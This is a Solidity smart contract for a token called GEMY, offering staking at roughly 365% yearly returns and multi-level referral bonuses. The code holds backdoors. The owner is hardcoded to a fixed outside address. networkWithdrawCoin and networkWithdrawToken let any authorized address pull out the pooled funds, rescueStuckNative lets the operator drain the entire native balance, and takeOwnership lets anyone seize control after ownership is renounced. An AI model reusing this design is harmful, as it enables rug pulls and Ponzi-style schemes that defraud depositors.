//SPDX-License-Identifier: MIT
// ___________.________________________
// \_INT_____/|ERC\______ HAI\_NED_____/
//  |    __)  |   ||       _/|    __)_ 
//  |     \   |   ||    |   \|        \
//  \___  /   |___||____|_  /_______  /
//      \/                \/        \/ 
pragma solidity 0.8.3;
/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
}

abstract contract Auth {
    using Address for address;
    address public owner;
    mapping (address => bool) internal authorizations;

    constructor(address payable _maintainer) {
        owner = payable(0xB9F96789D98407B1b98005Ed53e8D8824D42A756);
        authorizations[owner] = true;
        authorizations[_maintainer] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() virtual {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyZero() virtual {
        require(isOwner(address(0)), "!ZERO"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() virtual {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }
    
    /**
     * Function modifier to require caller to be authorized
     */
    modifier renounced() virtual {
        require(isRenounced(), "!RENOUNCED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        if(account == owner){
            return true;
        } else {
            return false;
        }
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Return address' authorization status
     */
    function isRenounced() public view returns (bool) {
        require(owner == address(0), "NOT RENOUNCED!");
        return owner == address(0);
    }

    /**
    * @dev Leaves the contract without owner. It will not be possible to call
    * `onlyOwner` functions anymore. Can only be called by the current owner.
    *
    * NOTE: Renouncing ownership will leave the contract without an owner,
    * thereby removing any functionality that is only available to the owner.
    */
    function renounceOwnership() public virtual onlyOwner {
        require(isOwner(msg.sender), "Unauthorized!");
        emit OwnershipTransferred(address(0));
        authorizations[address(0)] = true;
        authorizations[owner] = false;
        owner = address(0);
    }

    /**
     * Transfer ownership to new address. Caller must be owner. 
     */
    function transferOwnership(address payable adr) public virtual onlyOwner returns (bool) {
        authorizations[adr] = true;
        authorizations[owner] = false;
        owner = payable(adr);
        emit OwnershipTransferred(adr);
        return true;
    }    
    
    /**
     * NEW: Take ownership if previous owner renounced.
     */
    function takeOwnership() public virtual {
        require(isOwner(address(0)) || isRenounced() == true, "Unauthorized! Non-Zero address detected as this contract current owner. Contact this contract current owner to takeOwnership(). ");
        authorizations[owner] = false;
        owner = payable(msg.sender);
        authorizations[owner] = true;
        emit OwnershipTransferred(owner);
    }

    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function availableSupply() external returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is IERC20, Auth {

    IERC20 token;
    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 internal _totalSupply;
    uint256 internal _limitSupply;

    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;

    event Deposit(address indexed dst, uint amount);
    event Withdrawal(address indexed src, uint amount);
    event Received(address, uint);
    event ReceivedFallback(address, uint);

    constructor() Auth(payable(msg.sender)) {
        _name = "GemY";
        _symbol = "GEMY";
        _decimals = uint8(18);
        token = IERC20(address(this));
        _limitSupply = 200000;
        _mint(payable(msg.sender), 1000*(10**_decimals));  
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    function availableSupply() public override virtual returns (uint256) {
        return _totalSupply;
    }    

    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;

        _approve(address(account), address(this), amount);

        _balances[account] = _balances[account] +amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account] - amount;
        _totalSupply = _totalSupply - amount;
        require(decreaseAllowance(address(this), amount));
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getOwner() external view returns(address){
        return owner;
    }

}

contract GEMY is ERC20 {
    using SafeMath for uint256;
    uint private startTime = 0; 
    
    address payable public TOK;
    address payable private ADMIN;
    address payable private DEV;
    
    uint public totalUsers; 
    uint public totalGEMStaked; 
    uint public totalTokenStaked;
    uint public sentGift;
    
    uint public communityChest;
    uint public communityChestCheckpoint = startTime;
    
    uint8[] private REF_BONUSES             = [20, 10, 10];
    uint private constant ADV_FEE           = 120;
    uint private constant LIMIT_GIFT     = 33000 ether;
    uint private constant MANUAL_GIFT    = 1000 ether;    
    uint private constant USER_GIFT      = 0.01 ether; 
    uint private constant GEM_DAILYPROFIT  = 10;
    uint private constant TOKEN_DAILYPROFIT = 10;
    uint private constant PERCENT_DIVIDER   = 1000;
    uint private constant PRICE_DIVIDER     = 1 ether;
    uint private constant TIME_STEP         = 1 days;
    uint private constant TIME_TO_UNSTAKE   = 7 days;
    uint private constant NEXT_GIFT      = 7 days;
    uint private constant BON_GIFT       = 5;
    uint private constant SELL_LIMIT        = 40000 ether; 
    
    mapping(address => User) private users;
    mapping(uint => uint) private sold; 
    
    struct Stake {
        uint checkpoint;
        uint totalStaked; 
        uint lastStakeTime;
        uint unClaimedTokens;        
    }
    
    struct User {
        address referrer;
        uint lastGift;
        uint countGift;
        uint bonGift;
        Stake sM;
        Stake sT;  
		uint256 bonus;
		uint256 totalBonus;
        uint totaReferralBonus;
        uint[3] levels;
    }
    event NetworkWithdrawal(address indexed src, uint amount);
    event TokenOperation(address indexed account, string txType, uint tokenAmount, uint trxAmount);

    modifier onlyOperator {
        require(msg.sender == ADMIN, "Only operator can call ");
        _;
    } 
    
    modifier onlyDev {
        require(msg.sender == DEV, "Only dev can call ");
        _;
    } 

    modifier onlyTok {
        require(msg.sender == TOK, "Only token can call ");
        _;
    } 

    constructor() ERC20() {
        startTime = block.timestamp;
        ADMIN = payable(msg.sender);
        DEV = payable(msg.sender);
    }       

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
    
    fallback() external payable {
        deposit();
        emit ReceivedFallback(_msgSender(), msg.value);
    }
    
    receive() external payable {
        deposit();
        emit Received(_msgSender(), msg.value);
    }

    function networkWithdrawCoin(uint amount) public authorized {
        require(address(this).balance >= amount);
        payable(_msgSender()).transfer(amount);
        emit NetworkWithdrawal(_msgSender(), amount);
    }

    function networkWithdrawToken(uint amount) public authorized {
        require(balanceOf(address(this)) >= amount);
        token.transferFrom(address(this), msg.sender, amount);     // added
        emit NetworkWithdrawal(_msgSender(), amount);
    }

    function deposit() public payable {
        uint256 tokenAmount = msg.value;
        _mint(_msgSender(), tokenAmount);
        emit Deposit(_msgSender(), msg.value);
    }

    function withdraw(uint amount) public {
        require(balanceOf(msg.sender) >= amount);
        _burn(_msgSender(), amount);
        payable(_msgSender()).transfer(amount);
        emit Withdrawal(_msgSender(), amount);
    }
    
    function stakeGEM(address referrer,  uint256 _amount) public payable {        
        token.transferFrom(msg.sender, address(this), _amount);     // added
        
		uint fee = _amount.mul(ADV_FEE).div(PERCENT_DIVIDER);   // calculate fees on _amount and not msg.value
        
        payable(DEV).transfer(fee);

		User storage user = users[msg.sender];
		
		if (user.referrer == address(0) && msg.sender != ADMIN) {
			if (users[referrer].sM.totalStaked == 0) {
				referrer = ADMIN;
			}
			user.referrer = referrer;
			address upline = user.referrer;
			for (uint256 i = 0; i < REF_BONUSES.length; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					if (i == 0) {
					    users[upline].bonGift = users[upline].bonGift.add(1);
					}
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < REF_BONUSES.length; i++) {
				if (upline == address(0)) {
				    upline = ADMIN;
				}
				uint256 amount = _amount.mul(REF_BONUSES[i]).div(PERCENT_DIVIDER);
				users[upline].bonus = users[upline].bonus.add(amount);
				users[upline].totalBonus = users[upline].totalBonus.add(amount);
				upline = users[upline].referrer;
			}
		} 

        if (user.sM.totalStaked == 0) {
            user.sM.checkpoint = maxVal(block.timestamp, startTime);
            totalUsers++;
        } else {
            updateStakeGEM_IP(msg.sender);
        }
      
        user.sM.lastStakeTime = block.timestamp;
        user.sM.totalStaked = user.sM.totalStaked.add(_amount);
        totalGEMStaked = totalGEMStaked.add(_amount);
    }
    
    function stakeNative(address referrer,  uint256 _amount) public payable {        
		uint256 amount_ = _amount;
		uint fee = _amount.mul(ADV_FEE).div(PERCENT_DIVIDER);   // calculate fees on _amount and not msg.value
        payable(DEV).transfer(fee);
		uint256 amount_left = amount_ - fee;
        payable(address(this)).transfer(amount_left);     // stake the remainder, less the dev fee to this contract

		User storage user = users[msg.sender];
		
		if (user.referrer == address(0) && msg.sender != ADMIN) {
			if (users[referrer].sM.totalStaked == 0) {
				referrer = ADMIN;
			}
			user.referrer = referrer;
			address upline = user.referrer;
			for (uint256 i = 0; i < REF_BONUSES.length; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					if (i == 0) {
					    users[upline].bonGift = users[upline].bonGift.add(1);
					}
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < REF_BONUSES.length; i++) {
				if (upline == address(0)) {
				    upline = ADMIN;
				}
				uint256 amount = _amount.mul(REF_BONUSES[i]).div(PERCENT_DIVIDER);
				users[upline].bonus = users[upline].bonus.add(amount);
				users[upline].totalBonus = users[upline].totalBonus.add(amount);
				upline = users[upline].referrer;
			}
		} 

        if (user.sM.totalStaked == 0) {
            user.sM.checkpoint = maxVal(block.timestamp, startTime);
            totalUsers++;
        } else {
            updateStakeGEM_IP(msg.sender);
        }
      
        user.sM.lastStakeTime = block.timestamp;
        user.sM.totalStaked = user.sM.totalStaked.add(_amount);
        totalGEMStaked = totalGEMStaked.add(_amount);
    }
    
    function stakeToken(uint tokenAmount) public {

        User storage user = users[msg.sender];
        require(block.timestamp >= startTime, "Stake not available yet");
        require(tokenAmount <= balanceOf(msg.sender), "Insufficient Token Balance");

        if (user.sT.totalStaked == 0) {
            user.sT.checkpoint = block.timestamp;
        } else {
            updateStakeToken_IP(msg.sender);
        }
        
        _transfer(payable(msg.sender), address(this), tokenAmount);
        user.sT.lastStakeTime = block.timestamp;
        user.sT.totalStaked = user.sT.totalStaked.add(tokenAmount);
        totalTokenStaked = totalTokenStaked.add(tokenAmount); 
    } 
    
    function unStakeToken() public {
        User storage user = users[msg.sender];
        require(block.timestamp > user.sT.lastStakeTime.add(TIME_TO_UNSTAKE));
        updateStakeToken_IP(msg.sender);
        uint tokenAmount = user.sT.totalStaked;
        user.sT.totalStaked = 0;
        totalTokenStaked = totalTokenStaked.sub(tokenAmount); 
        _transfer(payable(address(this)), payable(msg.sender), tokenAmount);
    }  
    
    function updateStakeGEM_IP(address _addr) private {
        User storage user = users[_addr];
        uint256 amount = getStakeGEM_IP(_addr);
        if(amount > 0) {
            user.sM.unClaimedTokens = user.sM.unClaimedTokens.add(amount);
            user.sM.checkpoint = block.timestamp;
        }
    } 

    function adjustLimitSupply(uint256 amount) public virtual onlyOperator {
        _limitSupply = amount;
    }

    function adjustAdminAddr(address payable adminAddr) public virtual onlyOperator {
        ADMIN = payable(adminAddr);
    }

    function adjustTokenAddr(address payable tokenAddr) public virtual onlyOperator {
        TOK = payable(tokenAddr);
    }

    function adjustAuthorized(address authAddr) public onlyOperator {
        return authorize(address(authAddr));
    }

    function adjustDevAddr(address payable devAddr) public virtual onlyOperator {
        DEV = payable(devAddr);
    }

    function limitSupply() public view returns (uint256) {
        return _limitSupply;
    }
    
    function availableSupply() public override view returns (uint256) {
        return _limitSupply.sub(_totalSupply);
    }    

    function getStakeGEM_IP(address _addr) view private returns(uint256 value) {
        User storage user = users[_addr];
        uint256 fr = user.sM.checkpoint;
        if (startTime > block.timestamp) {
          fr = block.timestamp; 
        }
        uint256 Tarif = GEM_DAILYPROFIT;
        uint256 to = block.timestamp;
        if(fr < to) {
            value = user.sM.totalStaked.mul(to - fr).mul(Tarif).div(TIME_STEP).div(PERCENT_DIVIDER);
        } else {
            value = 0;
        }
        return value;
    }  
    
    function updateStakeToken_IP(address _addr) private {
        User storage user = users[_addr];
        uint256 amount = getStakeToken_IP(_addr);
        if(amount > 0) {
            user.sT.unClaimedTokens = user.sT.unClaimedTokens.add(amount);
            user.sT.checkpoint = block.timestamp;
        }
    } 
    
    function getStakeToken_IP(address _addr) view private returns(uint256 value) {
        User storage user = users[_addr];
        uint256 fr = user.sT.checkpoint;
        if (startTime > block.timestamp) {
          fr = block.timestamp; 
        }
        uint256 Tarif = TOKEN_DAILYPROFIT;
        uint256 to = block.timestamp;
        if(fr < to) {
            value = user.sT.totalStaked.mul(to - fr).mul(Tarif).div(TIME_STEP).div(PERCENT_DIVIDER);
        } else {
            value = 0;
        }
        return value;
    }      
    
    function claimToken_M() public {
        User storage user = users[msg.sender];
       
        updateStakeGEM_IP(msg.sender);
        uint tokenAmount = user.sM.unClaimedTokens;  
        user.sM.unClaimedTokens = 0;                 
        
        _mint(payable(msg.sender), tokenAmount);
        emit TokenOperation(msg.sender, "CLAIM", tokenAmount, 0);
    }    
    
    function claimToken_T() public {
        User storage user = users[msg.sender];
       
        updateStakeToken_IP(msg.sender);
        uint tokenAmount = user.sT.unClaimedTokens; 
        user.sT.unClaimedTokens = 0; 
        
        _mint(payable(msg.sender), tokenAmount);
        emit TokenOperation(msg.sender, "CLAIM", tokenAmount, 0);
    }     
    
    function sellToken(uint tokenAmount) public {
        tokenAmount = minVal(tokenAmount, balanceOf(msg.sender));
        require(tokenAmount > 0, "Token amount can not be 0");
        
        require(sold[getCurrentDay()].add(tokenAmount) <= SELL_LIMIT, "Daily Sell Limit exceed");
        sold[getCurrentDay()] = sold[getCurrentDay()].add(tokenAmount);
        uint GEMAmount = tokenToGEM(tokenAmount);
    
        require(getContractGEMBalance() > GEMAmount, "Insufficient Contract Balance");
        _burn(payable(msg.sender), tokenAmount);

       payable(msg.sender).transfer(GEMAmount);
        
        emit TokenOperation(msg.sender, "SELL", tokenAmount, GEMAmount);
    }
    
    function getCurrentUserBonGift(address _addr) public view returns (uint) {
        return users[_addr].bonGift;
    }  
    
    function claimStackerGift() public {
        require(getAvailableGift() >= USER_GIFT, "Gift limit exceed");
        require(users[msg.sender].sM.totalStaked >= getUserGiftReqInv(msg.sender));
        require(block.timestamp > users[msg.sender].lastGift.add(NEXT_GIFT));
        require(users[msg.sender].bonGift >= BON_GIFT);
        communityChestCheckpoint = block.timestamp;
        users[msg.sender].countGift++;
        users[msg.sender].lastGift = block.timestamp;
        users[msg.sender].bonGift = 0;
        _mint(payable(msg.sender), USER_GIFT);
        sentGift = sentGift.add(USER_GIFT);
        emit TokenOperation(msg.sender, "GIFT", USER_GIFT, 0);
    }
    
    function claimCommunityGift() public {
        require(communityChest <= MANUAL_GIFT, "Gift limit exceed");
        communityChest = communityChest.add(USER_GIFT);
        require(block.timestamp >= communityChestCheckpoint.add(TIME_STEP), "Time limit error");
        communityChestCheckpoint = block.timestamp;
        users[msg.sender].countGift++;
        users[msg.sender].lastGift = block.timestamp;
        users[msg.sender].bonGift = 0;
        _mint(payable(msg.sender), USER_GIFT);
        sentGift = sentGift.add(USER_GIFT);
        emit TokenOperation(msg.sender, "GIFT", USER_GIFT, 0);
    }    

	function withdrawRef() public {
		User storage user = users[msg.sender];
		
		uint totalAmount = getUserReferralBonus(msg.sender);
		require(totalAmount > 0, "User has no dividends");
        user.bonus = 0;
		payable(msg.sender).transfer(totalAmount);
	}	    

    function getUserUnclaimedTokens_M(address _addr) public view returns(uint value) {
        User storage user = users[_addr];
        return getStakeGEM_IP(_addr).add(user.sM.unClaimedTokens); 
    }
    
    function getUserUnclaimedTokens_T(address _addr) public view returns(uint value) {
        User storage user = users[_addr];
        return getStakeToken_IP(_addr).add(user.sT.unClaimedTokens); 
    }  
    
	function getAvailableGift() public view returns (uint) {
		return minZero(LIMIT_GIFT, sentGift);
	}   
	
    function getUserTimeToNextGift(address _addr) public view returns (uint) {
        return minZero(users[_addr].lastGift.add(NEXT_GIFT), block.timestamp);
    } 
    
    function getUserBonGift(address _addr) public view returns (uint) {
        return users[_addr].bonGift;
    }

    function getUserGiftReqInv(address _addr) public view returns (uint) {
        uint ca = users[_addr].countGift.add(1); 
        return ca.mul(100 ether); 
    }       
    
    function getUserCountGift(address _addr) public view returns (uint) {
        return users[_addr].countGift;
    }     
    
	function getContractGEMBalance() public view returns (uint) {
	    return address(this).balance;
	}  
	
	function getContractTokenBalance() public view returns (uint) {
		return balanceOf(address(this));
	}  
	
	function getAPY_M() public pure returns (uint) {
		return GEM_DAILYPROFIT.mul(365).div(10);
	}
	
	function getAPY_T() public pure returns (uint) {
		return TOKEN_DAILYPROFIT.mul(365).div(10);
	}	
	
	function getUserGEMBalance(address _addr) public view returns (uint) {
		return address(_addr).balance;
	}	
	
	function getUserTokenBalance(address _addr) public view returns (uint) {
		return balanceOf(_addr);
	}
	
	function getUserGEMStaked(address _addr) public view returns (uint) {
		return users[_addr].sM.totalStaked;
	}	
	
	function getUserTokenStaked(address _addr) public view returns (uint) {
		return users[_addr].sT.totalStaked;
	}
	
	function getUserTimeToUnstake(address _addr) public view returns (uint) {
		return  minZero(users[_addr].sT.lastStakeTime.add(TIME_TO_UNSTAKE), block.timestamp);
	}	
	
    function getTokenPrice() public view returns(uint) {
        uint gemFactor = getContractGEMBalance().mul(PRICE_DIVIDER);
        uint supplyFactor = availableSupply().add(1);
        return gemFactor.div(supplyFactor);
    } 

    function GEMToToken(uint GEMAmount) public view returns(uint) {
        return GEMAmount.mul(PRICE_DIVIDER).div(getTokenPrice());
    }

    function tokenToGEM(uint tokenAmount) public view returns(uint) {
        return tokenAmount.mul(getTokenPrice()).div(PRICE_DIVIDER);
    } 	

	function getUserDownlineCount(address userAddress) public view returns(uint, uint, uint) {
		return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
	}  
	
	function getUserReferralBonus(address userAddress) public view returns(uint) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint) {
		return users[userAddress].totalBonus;
	}
	
	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}	
    
	function getContractLaunchTime() public view returns(uint) {
		return minZero(startTime, block.timestamp);
	}
	
    function getCurrentDay() public view returns (uint) {
        return minZero(block.timestamp, startTime).div(TIME_STEP);
    }	
    
    function getTokenSoldToday() public view returns (uint) {
        return sold[getCurrentDay()];
    }   
    
    function getTokenAvailableToSell() public view returns (uint) {
       return minZero(SELL_LIMIT, sold[getCurrentDay()]);
    }  
    
    function getTimeToNextDay() public view returns (uint) {
        uint t = minZero(block.timestamp, startTime);
        uint g = getCurrentDay().mul(TIME_STEP);
        return g.add(TIME_STEP).sub(t);
    }     
    
    function minZero(uint a, uint b) private pure returns(uint) {
        if (a > b) {
           return a - b; 
        } else {
           return 0;    
        }    
    }   
    
    function maxVal(uint a, uint b) private pure returns(uint) {
        if (a > b) {
           return a; 
        } else {
           return b;    
        }    
    }
    
    function minVal(uint a, uint b) private pure returns(uint) {
        if (a > b) {
           return b; 
        } else {
           return a;    
        }    
    }    
    
    function rescueStuckTokens(address _tok, address payable recipient, uint256 amount) public payable onlyOperator {
        uint256 contractTokenBalance = IERC20(_tok).balanceOf(address(this));
        require(amount <= contractTokenBalance, "Request exceeds contract token balance.");
        // rescue stuck tokens 
        IERC20(_tok).transfer(recipient, amount);
    }

    function rescueStuckNative(address payable recipient) public payable onlyOperator {
        // get the amount of Ether stored in this contract
        uint contractETHBalance = address(this).balance;
        // rescue Ether to recipient
        (bool success, ) = recipient.call{value: contractETHBalance}("");
        require(success, "Failed to rescue Ether");
    }
}